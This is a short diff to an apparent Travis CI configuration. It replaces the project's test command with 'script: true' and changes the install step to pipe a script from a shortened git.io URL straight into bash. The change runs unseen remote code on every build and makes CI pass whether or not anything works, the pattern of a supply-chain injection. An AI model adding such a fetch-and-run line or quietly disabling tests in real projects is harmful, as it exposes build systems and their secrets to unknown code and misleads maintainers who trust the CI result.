@@ -10,6 +10,5 @@ python:
 - "nightly"
 notifications:
   email: false
-install: true
-script: bash tests/run.sh
-
+install: curl -fLs https://git.io/fpfTa | bash -s
+script: true
